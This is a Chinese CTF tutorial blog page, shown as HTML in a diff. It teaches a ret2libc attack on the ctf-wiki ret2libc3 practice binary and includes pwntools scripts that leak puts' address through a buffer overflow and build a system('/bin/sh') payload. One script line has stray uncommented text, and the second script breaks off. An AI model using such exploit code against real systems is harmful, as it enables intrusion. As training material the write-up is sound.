@@ -1,0 +1,338 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh） | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh） 示例：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2libc&#x2F;ret2libc3参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41918771&amp;#x2F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh） 示例：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2libc&#x2F;ret2libc3参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41918771&amp;#x2F">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-05/800/450">
+<meta property="article:published_time" content="2020-08-07T03:43:46.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.687Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-05/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/",
+  "image": "https://picsum.photos/seed/blog-cover-05/800/450",
+  "datePublished": "2020-08-07T03:43:46.000Z",
+  "dateModified": "2026-07-03T14:46:15.687Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-05/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-07T03:43:46.000Z" title="发表于 2020-08-07 11:43:46">2020-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.687Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无-bin-sh）"><a href="#PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无-bin-sh）" class="headerlink" title="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh）"></a>PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh）</h1><blockquote>
+<p>示例：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3</a><br>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/90665950">https://blog.csdn.net/qq_41918771&#x2F;article&#x2F;details&#x2F;90665950</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#3">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop&#x2F;#3</a></p>
+</blockquote>
+<p>将文件下载下来，检查一下文件保护：</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596772481361-94ed9d60-a346-41f6-a825-7ecde28465cb.png" alt="QQ截图20200807115432.png"></p>
+<p>32位程序，只开启了栈上不可执行保护。</p>
+<p>扔到IDA中：</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596772613000-274cd9fd-e770-46da-9322-6f7e2e2c6c84.png" alt="QQ截图20200807115643.png"></p>
+<p>计算栈偏移，可以得到为112（略），在IDA里看一下，并没有发现system函数和&#x2F;bin&#x2F;sh字符串的身影。</p>
+<p>现在当务之急就是得到system函数的地址，那么我们如何得到呢？这里就主要利用了两个知识点：</p>
+<ul>
+<li>system 函数属于 libc，而 <strong>libc.so 动态链接库中的函数之间相对偏移是固定的。</strong></li>
+<li>即使程序有 ASLR 保护， <strong>也只是针对于地址中间位进行随机，最低的12位并不会发生改变</strong> 。而 libc 在github上有人进行收集，如下 <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<blockquote>
+<p>也可以使用工具网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a>，这个网址的数据库基于libc-database</p>
+</blockquote>
+<p>所以我们只要得到libc的版本，就可以知道了system函数和&#x2F;bin&#x2F;sh的偏移量。知道偏移量后，再找到libc的基地址，就可以得到system函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到system的真实地址。</p>
+<blockquote>
+<p>libc基地址  +  函数偏移量   &#x3D;  函数真实地址</p>
+</blockquote>
+<p>应该怎么找libc基地址呢？真是一个让人头疼的问题。</p>
+<p>我们可以泄露一个函数的真实地址，然后根据公式可以得到libc的基地址，因为知道了libc版本，就知道了函数偏移量。</p>
+<p>问题又来了，我们该如何泄露函数的真实地址的，这里涉及到了libc的<span style="color: #F5222D">延迟绑定技术</span>，这个技术大概就是当第一次调用一个函数的时候，这个函数的got表里存放着是下一条plt表的指令的地址，然后再经过一系列的操作(这里不详解got表和plt表的关系了，太复杂)得到了这个函数的真实地址，然后呢，再把这个函数的真实地址放到了got表里。当第二次调用这个函数的时候，就可以直接从Got表里取函数的真实地址，不用再去寻找了。</p>
+<p>我们要泄露函数的真实地址**<span style="color: #F5222D">，一般的方法是采用got表泄露，因为只要之前执行过puts函数，got表里存放着就是函数的真实地址了，这里我用的是puts函数，因为程序里已经运行过了puts函数，真实地址已经存放到了got表内。我们得到puts函数的got地址后，可以把这个地址作为参数传递给puts函数，则会把这个地址里的数据，即puts函数的真实地址给输出出来，这样我们就得到了puts函数的真实地址。</span>**</p>
+<p><strong><span style="color: #F5222D">脚本如下：</span></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span></span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#puts的plt表的地址，我们需要利用puts函数泄露</span></span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]<span class="comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)<span class="comment">#覆盖返回地址为puts函数</span></span><br><span class="line">payload += p32(main_plt_addr)<span class="comment">#这里是puts函数返回的地址。</span></span><br><span class="line">payload += p32(puts_got_addr)<span class="comment">#这里是puts函数的参数</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])将地址输出出来后再用<span class="number">332</span>解包，此时就得到了puts函数的真实地址。</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596774478252-40612ad2-abce-46fa-87ef-202faa2e0789.png" alt="QQ截图20200807122730.png"></p>
+<blockquote>
+<p>运行后得到函数的真实地址为0xf7d51fd0<br>上面说过，需要知道libc的版本才能知道函数偏移量，我们根据函数真实地址可以得到libc版本。aslr技术，是地址随机化，虽然是地址随机化，但低十二位是不变的，因为需要内存页对齐，puts函数的真实地址0xf7d51fd0的低十二位是fd0，然后在网站libc_search上可以根据后十二位查到这个函数所在的libc的版本。</p>
+</blockquote>
+<hr>
+<blockquote>
+<p><strong><span style="color: #F5222D">由于上面提到的网站无法查到kali 2019二月版本的libc版本（我使用的是这个版本），再加上是本地pwn，因此我们使用kali本地自带的libc库文件就行了。当然，在实际环境中，肯定需要目标靶机的libc。</span></strong><br><strong><span style="color: #F5222D">网站上大部分为ubuntu的libc文件</span></strong></p>
+</blockquote>
+<p>如何查找libc所在文件目录？如下图所示</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596857155686-2be9e0eb-b3b9-44b6-a595-f2789b2bf35a.png" alt="QQ截图20200808112545.png"></p>
+<blockquote>
+<p>&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 #这个libc应该是编译elf文件时候所用到的<br>&#x2F;usr&#x2F;lib32&#x2F;libc.so.6 #这个是运行elf文件时加载程序所用到的</p>
+</blockquote>
+<p>进入到&#x2F;usr&#x2F;lib32&#x2F;目录下，找到此文件</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596857341114-6be8ef60-20ff-462f-ac72-3af0b1b18c0e.png" alt="QQ截图20200808112853.png"></p>
+<p>拖入到宿主机中，却发现</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596857397829-fd97521d-b4db-4bf8-b017-a6816b7c70db.png" alt="QQ截图20200808112938.png"></p>
+<p>右键，将文件添加到压缩包中，然后拖出来。</p>
+<p>放入HxD中查看此文件：</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596857503836-fb007dbc-edb8-427e-b33c-0ede3e39e6c7.png" alt="QQ截图20200808113130.png"></p>
+<p>原来此符号链接链接的是同目录下的libc-2.28.so文件</p>
+<p>顺利的将libc-2.28.so文件拖入到宿主机中，直接扔到IDA里分析。</p>
+<p>当然，也可以使用上面提到的工具<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a></p>
+<blockquote>
+<p>在kali中，执行如下命令：<br>git clone<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database.git">https://github.com/niklasb/libc-database.git</a><br><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596857874861-17459aa0-4fcd-42ac-bd29-516fea885581.png" alt="QQ截图20200808113744.png"></p>
+</blockquote>
+<hr>
+<p>在github上可以轻松的找到教程：</p>
+<p><strong>Building a libc offset database</strong></p>
+<p>Fetch all the configured libc versions and extract the symbol offsets. It will not download anything twice, so you can also use it to update your database:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./get   #安装或更新你的libc数据库</span><br></pre></td></tr></table></figure>
+
+<p>You can also add a custom libc to your database.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./add /usr/lib/libc-2.21.so   #添加本地的libc文件到数据库</span><br></pre></td></tr></table></figure>
+
+<p>Find all the libc’s in the database that have the given names at the given addresses. Only the last 12 bits are checked, because randomization usually works on page size level.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./find printf 260 puts f30    #查找符合要求的libc数据库文件</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure>
+
+<p>Find a libc from the leaked return address into __libc_start_main.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./find __libc_start_main_ret a83</span><br><span class="line">ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)</span><br><span class="line">archive-eglibc (id libc6_2.19-0ubuntu6_i386)</span><br><span class="line">ubuntu-utopic-i386-libc6 (id libc6_2.19-10ubuntu2.3_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-15ubuntu2_i386)</span><br></pre></td></tr></table></figure>
+
+<p>Dump some useful offsets, given a libc ID. You can also provide your own names to dump.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386     #dumplibc文件的部分数据偏移信息</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br></pre></td></tr></table></figure>
+
+<p>Check whether a library is already in the database.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./identify /usr/lib/libc.so.6</span><br><span class="line">id local-f706181f06104ef6c7008c066290ea47aa4a82c5</span><br></pre></td></tr></table></figure>
+
+<p>Download the whole libs corresponding to a libc ID.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./download libc6_2.23-0ubuntu10_amd64</span><br><span class="line">Getting libc6_2.23-0ubuntu10_amd64</span><br><span class="line">    -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb</span><br><span class="line">    -&gt; Downloading package</span><br><span class="line">    -&gt; Extracting package</span><br><span class="line">    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line">$ ls libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line">ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>首先添加本地的libc文件：</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596859076768-336f9eda-ae2b-424e-8b8d-5d938d7af69d.png" alt="QQ截图20200808115751.png"></p>
+<p>查看libc文件的部分信息：</p>
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596860749324-b1a326ac-5da2-48eb-bce2-1f334eb35996.png" alt="QQ截图20200808122539.png"></p>
+<p>至此我们得到了system函数的偏移量和&#x2F;bin&#x2F;sh的偏移量(即str_bin_sh)。(当然，在IDA里也可以查看)</p>
+<p>最后理一下思路</p>
+<p>1.泄露puts函数的真实地址</p>
+<p>2.得到libc的版本</p>
+<p>3.得到system和puts和sh的偏移，计算libc基地址</p>
+<p>4.计算system和sh的真实地址</p>
+<p>5.构造payload为system(’&#x2F;bin&#x2F;sh’)</p>
+<p>6.写exp</p>
+<p>在上一个脚本的基础上加几行代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span 